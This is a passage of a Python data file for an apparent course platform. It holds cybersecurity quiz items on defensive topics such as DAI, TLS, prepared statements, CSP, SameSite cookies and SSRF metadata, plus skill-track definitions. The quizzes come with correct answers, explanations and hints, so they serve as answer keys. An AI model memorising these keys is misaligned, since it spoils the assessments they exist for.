                'explanation': 'DNSSEC signs DNS records cryptographically. Resolvers verify signatures against the parent zone trust chain, discarding forged IP answers.',
                'hint': 'Digital signatures verify authenticity.'
            }
        ]
    },
    {
        'id': 'quiz-cyber-arp-spoofing-mitm-defense',
        'lesson_slug': 'cyber-arp-spoofing-mitm-defense',
        'title': 'ARP Spoofing & DAI Defense Quiz',
        'passing_score': 70,
        'questions': [
            {
                'id': 'q1',
                'type': 'multiple_choice',
                'question': 'What enterprise network switch feature validates Layer 2 ARP broadcasts against trusted DHCP IP-MAC mappings?',
                'options': ['Dynamic ARP Inspection (DAI)', 'Spanning Tree Protocol (STP)', 'BGP Routing', 'VLAN Tagging'],
                'correct_answer': 0,
                'points': 10,
                'skill_tag': 'cyber_network',
                'explanation': 'DAI intercepts ARP packets on untrusted switch ports and validates them against the DHCP Snooping database to prevent ARP poisoning.',
                'hint': 'Dynamic ARP Inspection.'
            }
        ]
    },
    {
        'id': 'quiz-cyber-symmetric-asymmetric-encryption',
        'lesson_slug': 'cyber-symmetric-asymmetric-encryption',
        'title': 'Symmetric vs Asymmetric Encryption Quiz',
        'passing_score': 70,
        'questions': [
            {
                'id': 'q1',
                'type': 'multiple_choice',
                'question': 'Why do modern protocols like TLS 1.3 use Hybrid Cryptography instead of pure RSA for all communication?',
                'options': [
                    'Because RSA keys cannot encrypt strings.',
                    'Because symmetric AES is thousands of times faster for bulk data transmission than asymmetric RSA.',
                    'Because AES requires no secret key.',
                    'Because TLS does not support asymmetric cryptography.'
                ],
                'correct_answer': 1,
                'points': 10,
                'skill_tag': 'cyber_crypto',
                'explanation': 'Asymmetric cryptography is computationally expensive. Hybrid systems use asymmetric crypto only for key exchange, then use fast hardware-accelerated AES for bulk data.',
                'hint': 'Consider the CPU performance differences between AES and RSA.'
            }
        ]
    },
    {
        'id': 'quiz-cyber-sha256-hashing-avalanche',
        'lesson_slug': 'cyber-sha256-hashing-avalanche',
        'title': 'Cryptographic Hashing & Avalanche Quiz',
        'passing_score': 70,
        'questions': [
            {
                'id': 'q1',
                'type': 'multiple_choice',
                'question': 'What does the Avalanche Effect in secure hashing algorithms describe?',
                'options': [
                    'Hashes getting progressively longer as input size grows.',
                    'A tiny 1-bit change in input resulting in a drastically different (>50% bit flip) output hash.',
                    'Hash collisions occurring rapidly under high server load.',
                    'Hashes automatically decrypting when an error occurs.'
                ],
                'correct_answer': 1,
                'points': 10,
                'skill_tag': 'cyber_crypto',
                'explanation': 'The avalanche effect ensures that even a microscopic change to plaintext input diffuses pseudo-randomly across the entire hash digest.',
                'hint': 'A small change causes a massive cascade of differences.'
            }
        ]
    },
    {
        'id': 'quiz-cyber-pki-tls-handshake',
        'lesson_slug': 'cyber-pki-tls-handshake',
        'title': 'PKI & TLS 1.3 Handshake Quiz',
        'passing_score': 70,
        'questions': [
            {
                'id': 'q1',
                'type': 'multiple_choice',
                'question': 'How does a browser verify that a website\'s TLS certificate was legitimately issued by a Certificate Authority?',
                'options': [
                    'By verifying the digital signature on the certificate using the CA\'s trusted public key.',
                    'By emailing the domain owner.',
                    'By hashing the client\'s IP address.',
                    'By running an Nmap port scan on the server.'
                ],
                'correct_answer': 0,
                'points': 10,
                'skill_tag': 'cyber_crypto',
                'explanation': 'The CA signs certificates with its private key; browsers verify this signature using pre-installed trusted CA public root certificates.',
                'hint': 'Digital signatures are verified using public keys.'
            }
        ]
    },
    {
        'id': 'quiz-cyber-ecc-elliptic-curve-diffie-hellman',
        'lesson_slug': 'cyber-ecc-elliptic-curve-diffie-hellman',
        'title': 'Elliptic Curve Cryptography Quiz',
        'passing_score': 70,
        'questions': [
            {
                'id': 'q1',
                'type': 'multiple_choice',
                'question': 'Why does a 256-bit Elliptic Curve (ECC) key provide equivalent security to a 3072-bit RSA key?',
                'options': [
                    'Because ECC uses larger prime numbers.',
                    'Because solving the Elliptic Curve Discrete Logarithm Problem (ECDLP) is mathematically far more difficult per bit than integer factorization.',
                    'Because ECC keys are compressed with Gzip.',
                    'Because RSA keys are deprecated.'
                ],
                'correct_answer': 1,
                'points': 10,
                'skill_tag': 'cyber_crypto',
                'explanation': 'There are no known sub-exponential classical algorithms to solve ECDLP, allowing 256-bit ECC keys to match 3072-bit RSA security.',
                'hint': 'Mathematical density of the discrete logarithm problem on elliptic curves.'
            }
        ]
    },
    {
        'id': 'quiz-cyber-post-quantum-cryptography',
        'lesson_slug': 'cyber-post-quantum-cryptography',
        'title': 'Post-Quantum Cryptography Quiz',
        'passing_score': 70,
        'questions': [
            {
                'id': 'q1',
                'type': 'multiple_choice',
                'question': 'Which quantum computing algorithm threatens to break classical RSA and ECC cryptography in polynomial time?',
                'options': ["Grover's Algorithm", "Shor's Algorithm", "Deutsch-Jozsa Algorithm", "Quantum Annealing"],
                'correct_answer': 1,
                'points': 10,
                'skill_tag': 'cyber_crypto',
                'explanation': "Shor's algorithm computes discrete logarithms and prime factors in polynomial time, breaking RSA and ECC.",
                'hint': "Shor's algorithm."
            }
        ]
    },
    {
        'id': 'quiz-cyber-sqli-parameterized-defense',
        'lesson_slug': 'cyber-sqli-parameterized-defense',
        'title': 'SQL Injection Defense Quiz',
        'passing_score': 70,
        'questions': [
            {
                'id': 'q1',
                'type': 'multiple_choice',
                'question': 'Why do Parameterized Prepared Statements prevent SQL Injection attacks completely?',
                'options': [
                    'They convert all letters to uppercase.',
                    'They compile the SQL command tree first and treat user inputs strictly as literal data values that cannot alter syntax.',
                    'They run the database in read-only mode.',
                    'They block all single quote characters from being typed.'
                ],
                'correct_answer': 1,
                'points': 10,
                'skill_tag': 'cyber_owasp',
                'explanation': 'Parameterized queries separate SQL structure from user data. Data passed into parameters cannot be interpreted as SQL commands.',
                'hint': 'Code and data are separated at the database protocol level.'
            }
        ]
    },
    {
        'id': 'quiz-cyber-xss-sanitization-csp',
        'lesson_slug': 'cyber-xss-sanitization-csp',
        'title': 'XSS & Content Security Policy Quiz',
        'passing_score': 70,
        'questions': [
            {
                'id': 'q1',
                'type': 'multiple_choice',
                'question': 'What is the purpose of a `Content-Security-Policy` HTTP header in web security?',
                'options': [
                    'To encrypt database tables.',
                    'To instruct the browser on which domain sources and script origins are trusted for execution.',
                    'To increase CSS rendering speed.',
                    'To generate user passwords.'
                ],
                'correct_answer': 1,
                'points': 10,
                'skill_tag': 'cyber_owasp',
                'explanation': 'CSP restricts script execution sources, blocking unauthorized inline scripts and mitigating XSS impact.',
                'hint': 'It tells the browser what script sources are allowed.'
            }
        ]
    },
    {
        'id': 'quiz-cyber-jwt-security-session-hardening',
        'lesson_slug': 'cyber-jwt-security-session-hardening',
        'title': 'JWT Security Quiz',
        'passing_score': 70,
        'questions': [
            {
                'id': 'q1',
                'type': 'multiple_choice',
                'question': 'What prevents a malicious client from modifying their JWT payload from `role: "user"` to `role: "admin"`?',
                'options': [
                    'The JWT payload is encrypted with AES.',
                    'The server recalculates the cryptographic signature with its secret key and detects that the signature no longer matches the payload.',
                    'The client browser prevents JSON editing.',
                    'Base64 decoding is irreversible.'
                ],
                'correct_answer': 1,
                'points': 10,
                'skill_tag': 'cyber_owasp',
                'explanation': 'The signature depends on both payload and secret key. Altering the payload invalidates the signature unless the attacker knows the secret key.',
                'hint': 'Signature validation detects any payload tampering.'
            }
        ]
    },
    {
        'id': 'quiz-cyber-csrf-same-site-tokens',
        'lesson_slug': 'cyber-csrf-same-site-tokens',
        'title': 'CSRF & SameSite Cookies Quiz',
        'passing_score': 70,
        'questions': [
            {
                'id': 'q1',
                'type': 'multiple_choice',
                'question': 'Why does setting the `SameSite=Strict` cookie attribute prevent Cross-Site Request Forgery (CSRF)?',
                'options': [
                    'It encrypts the cookie with RSA.',
                    'It instructs the browser never to include the cookie on cross-origin requests, blocking ambient credential transmission.',
                    'It deletes the cookie after 5 seconds.',
                    'It disables all JavaScript on the website.'
                ],
                'correct_answer': 1,
                'points': 10,
                'skill_tag': 'cyber_owasp',
                'explanation': 'SameSite=Strict stops the browser from attaching cookies when a request originates from an external site, defeating CSRF.',
                'hint': 'Cookies are withheld on cross-site requests.'
            }
        ]
    },
    {
        'id': 'quiz-cyber-ssrf-internal-metadata-defense',
        'lesson_slug': 'cyber-ssrf-internal-metadata-defense',
        'title': 'SSRF & Cloud Metadata Quiz',
        'passing_score': 70,
        'questions': [
            {
                'id': 'q1',
                'type': 'multiple_choice',
                'question': 'In a cloud environment (AWS/GCP/Azure), why do attackers target the IP `169.254.169.254` during SSRF exploitation?',
                'options': [
                    'To crash the internet gateway.',
                    'To query the local Instance Metadata Service (IMDS) and extract temporary IAM role credentials.',
                    'To format the hard drive.',
                    'To brute force SSH passwords.'
                ],
                'correct_answer': 1,
                'points': 10,
                'skill_tag': 'cyber_owasp',
                'explanation': 'The link-local address 169.254.169.254 hosts instance metadata, including temporary IAM security credentials for the running VM.',
                'hint': 'Instance Metadata Service (IMDS) token exfiltration.'
            }
        ]
    },
    {
        'id': 'quiz-cyber-zero-trust-microsegmentation',
        'lesson_slug': 'cyber-zero-trust-microsegmentation',
        'title': 'Zero Trust Architecture Quiz',
        'passing_score': 70,
        'questions': [
            {
                'id': 'q1',
                'type': 'multiple_choice',
                'question': 'What is the foundational philosophy of Zero Trust Architecture?',
                'options': [
                    'Trust everything inside the corporate VPN.',
                    'Never Trust, Always Verify — assume breach and verify identity, device, and permissions on every request.',
                    'Block all external internet connections permanently.',
                    'Use passwords without multi-factor authentication.'
                ],
                'correct_answer': 1,
                'points': 10,
                'skill_tag': 'cyber_defense',
                'explanation': 'Zero Trust treats internal networks as untrusted and verifies every transaction explicitly with least privilege.',
                'hint': 'Never Trust, Always Verify.'
            }
        ]
    },
    {
        'id': 'quiz-cyber-password-salting-argon2',
        'lesson_slug': 'cyber-password-salting-argon2',
        'title': 'Password Hashing & Salting Quiz',
        'passing_score': 70,
        'questions': [
            {
                'id': 'q1',
                'type': 'multiple_choice',
                'question': 'Why does adding a unique Cryptographic Salt to passwords defeat precomputed Rainbow Table attacks?',
                'options': [
                    'Because salts encrypt passwords with RSA.',
                    'Because unique salts ensure identical passwords produce completely distinct hashes, rendering precomputed lookup tables useless.',
                    'Because salts reduce password length.',
                    'Because salts make hashing instantaneous.'
                ],
                'correct_answer': 1,
                'points': 10,
                'skill_tag': 'cyber_defense',
                'explanation': 'Rainbow tables precompute hashes for common passwords. A 128-bit unique salt forces attackers to recompute tables for every individual user.',
                'hint': 'Unique salts force attackers to calculate hashes per user instead of using precomputed tables.'
            }
        ]
    },
    {
        'id': 'quiz-cyber-incident-response-containment',
        'lesson_slug': 'cyber-incident-response-containment',
        'title': 'Incident Response Lifecycle Quiz',
        'passing_score': 70,
        'questions': [
            {
                'id': 'q1',
                'type': 'multiple_choice',
                'question': 'In the NIST Incident Response Framework, what is the immediate goal of the Containment phase?',
                'options': [
                    'Blaming employees for the breach.',
                    'Isolating compromised systems to stop lateral infection spread while preserving digital forensics.',
                    'Formatting all servers immediately without taking backups.',
                    'Shutting down company operations forever.'
                ],
                'correct_answer': 1,
                'points': 10,
                'skill_tag': 'cyber_defense',
                'explanation': 'Containment isolates affected hosts/subnets to prevent attackers from moving laterally while preserving volatile memory forensics.',
                'hint': 'Stop the bleeding without destroying forensic evidence.'
            }
        ]
    },
    {
        'id': 'quiz-cyber-mitre-attack-matrix-threat-hunting',
        'lesson_slug': 'cyber-mitre-attack-matrix-threat-hunting',
        'title': 'MITRE ATT&CK Threat Hunting Quiz',
        'passing_score': 70,
        'questions': [
            {
                'id': 'q1',
                'type': 'multiple_choice',
                'question': 'Why is behavioral detection based on the MITRE ATT&CK framework more effective than traditional hash-based antivirus signatures?',
                'options': [
                    'Because attackers can change binary hashes with 1 bit of code, but cannot easily change underlying behavioral techniques (like process injection or credential dumping).',
                    'Because MITRE ATT&CK runs faster in CPU cache.',
                    'Because antivirus signatures use too much RAM.',
                    'Because MITRE rules require no log collection.'
                ],
                'correct_answer': 0,
                'points': 10,
                'skill_tag': 'cyber_defense',
                'explanation': "The Pyramid of Pain shows that TTPs are tough for adversaries to change, whereas file hashes are trivial to modify.",
                'hint': 'Techniques and behaviors are much harder for attackers to alter than simple file hashes.'
            }
        ]
    },
    {
        'id': 'quiz-cyber-memory-forensics-volatility',
        'lesson_slug': 'cyber-memory-forensics-volatility',
        'title': 'Live Memory Forensics Quiz',
        'passing_score': 70,
        'questions': [
            {
                'id': 'q1',
                'type': 'multiple_choice',
                'question': 'Why is memory forensics essential for detecting "fileless" malware?',
                'options': [
                    'Because fileless malware runs exclusively in volatile RAM and never writes malicious binary files to disk.',
                    'Because memory is always encrypted with AES.',
                    'Because RAM dumps are smaller than hard drives.',
                    'Because fileless malware only infects routers.'
                ],
                'correct_answer': 0,
                'points': 10,
                'skill_tag': 'cyber_defense',
                'explanation': 'Fileless malware resides purely in process memory; inspecting physical RAM dumps reveals injected PE headers that disk scans miss.',
                'hint': 'Fileless malware exists only in RAM.'
            }
        ]
    }
]

# -----------------------------------------------------------------
# SKILLS DATA (8 Skills Updated with all matching lessons)
# -----------------------------------------------------------------
DSA_CYBER_SKILLS = [
    # --- DSA Skills ---
    {
        'id': 'skill-dsa-arrays-pointers',
        'name': 'Arrays, Two Pointers & Binary Search',
        'category': 'Arrays & Strings',
        'description': 'Master Big-O analysis, contiguous array indexing, inward two-pointer convergence, sliding windows, and rotated binary search.',
        'icon': 'Binary',
        'tier': 1,
        'prerequisites': [],
        'mastery_threshold': 70,
        'matching_lessons': [
            'dsa-big-o-memory-arrays',
            'dsa-two-pointers-technique',
            'dsa-sliding-window-prefix-sums',
            'dsa-binary-search-variants',
            'dsa-bitwise-algorithms-xor'
        ]
    },
    {
        'id': 'skill-dsa-lists-stacks',
        'name': 'Linked Lists, Stacks & LRU Cache',
        'category': 'Linked Lists & Stacks',
        'description': 'Master pointer manipulation, in-place reversals, Floyd cycle detection, monotonic stacks, and O(1) LRU Cache architecture.',
        'icon': 'Layers',
        'tier': 2,
        'prerequisites': ['skill-dsa-arrays-pointers'],
        'mastery_threshold': 70,
        'matching_lessons': [
            'dsa-linked-list-reversal-dummy',
            'dsa-floyd-cycle-detection',
            'dsa-monotonic-stacks-queues',
            'dsa-sliding-window-maximum-deque',
            'dsa-lru-cache-doubly-linked-list'
        ]
    },
    {
        'id': 'skill-dsa-trees-graphs',
        'name': 'BST, Graph Traversals & Tries',
        'category': 'Trees & Graphs',
        'description': 'Master BST validation, level-order BFS shortest path, recursive DFS backtracking, prefix Tries, and Disjoint Set Union (Union-Find).',
        'icon': 'GitBranch',
        'tier': 3,
        'prerequisites': ['skill-dsa-lists-stacks'],
        'mastery_threshold': 70,
        'matching_lessons': [
            'dsa-bst-validation-operations',
            'dsa-graph-bfs-traversals',
            'dsa-dfs-topological-sort',
            'dsa-trie-autocomplete-prefix',
            'dsa-union-find-disjoint-set'
        ]
    },
    {
        'id': 'skill-dsa-dynamic-programming',
        'name': 'Dynamic Programming, Grid DP & LIS',
        'category': 'Dynamic Programming',
        'description': 'Master memoization vs tabulation, 1D decision state transitions, 2D Knapsack, Grid DP obstacle paths, and O(N log N) patience sort LIS.',
        'icon': 'Box',
        'tier': 4,
        'prerequisites': ['skill-dsa-trees-graphs'],
        'mastery_threshold': 70,
        'matching_lessons': [
            'dsa-memoization-vs-tabulation',
            'dsa-1d-dp-state-transitions',
            'dsa-2d-knapsack-matrix',
            'dsa-unique-paths-2d-grid',
            'dsa-longest-increasing-subsequence'
        ]
    },

    # --- Cyber Security Skills ---
    {
        'id': 'skill-cyber-network-defense',
        'name': 'Network Defense, DNSSEC & Firewalls',
        'category': 'Network Security',
        'description': 'Master CIA Triad threat modeling, TCP handshakes, port scanning, stateful firewalls, DNSSEC, and Layer 2 ARP inspection.',
        'icon': 'ShieldCheck',
        'tier': 1,
        'prerequisites': [],
        'mastery_threshold': 70,
        'matching_lessons': [
            'cyber-cia-triad-threat-modeling',
            'cyber-tcp-handshake-port-scanning',
            'cyber-stateful-firewall-defense',
            'cyber-dns-poisoning-dnssec',
            'cyber-arp-spoofing-mitm-defense'
        ]
    },
    {
        'id': 'skill-cyber-cryptography-pki',
        'name': 'Applied Cryptography, ECC & PQC',
        'category': 'Applied Cryptography',
        'description': 'Master symmetric AES, asymmetric RSA, SHA-256 avalanche effect, TLS 1.3 certificates, Elliptic Curve Diffie-Hellman, and Post-Quantum lattice cryptography.',
        'icon': 'Lock',
        'tier': 2,
        'prerequisites': ['skill-cyber-network-defense'],
        'mastery_threshold': 70,
        'matching_lessons': [
            'cyber-symmetric-asymmetric-encryption',
            'cyber-sha256-hashing-avalanche',
            'cyber-pki-tls-handshake',
            'cyber-ecc-elliptic-curve-diffie-hellman',
            'cyber-post-quantum-cryptography'
        ]
    },
    {
        'id': 'skill-cyber-owasp-web-defense',
        'name': 'OWASP Top 10, CSRF & SSRF Defense',
        'category': 'Web App Security & OWASP',
        'description': 'Master SQL injection prepared statement defenses, XSS sanitization, CSP headers, JWT verification, Anti-CSRF tokens, and SSRF metadata guards.',
        'icon': 'ShieldAlert',
        'tier': 3,
        'prerequisites': ['skill-cyber-cryptography-pki'],
        'mastery_threshold': 70,
        'matching_lessons': [
            'cyber-sqli-parameterized-defense',
            'cyber-xss-sanitization-csp',
            'cyber-jwt-security-session-hardening',
            'cyber-csrf-same-site-tokens',
            'cyber-ssrf-internal-metadata-defense'
        ]
    },
    {
        'id': 'skill-cyber-zero-trust-threat-hunting',
        'name': 'Zero Trust, MITRE ATT&CK & Memory Forensics',
        'category': 'Threat Hunting & Zero Trust',
        'description': 'Master Zero Trust micro-segmentation, password entropy salting, NIST Incident Response, MITRE ATT&CK Sigma rules, and Volatile RAM memory dump analysis.',
        'icon': 'Cpu',
        'tier': 4,
        'prerequisites': ['skill-cyber-owasp-web-defense'],
        'mastery_threshold': 70,
        'matching_lessons': [
            'cyber-zero-trust-microsegmentation',
            'cyber-password-salting-argon2',
            'cyber-incident-response-containment',
            'cyber-mitre-attack-matrix-threat-hunting',
            'cyber-memory-forensics-volatility'
        ]
    }
]
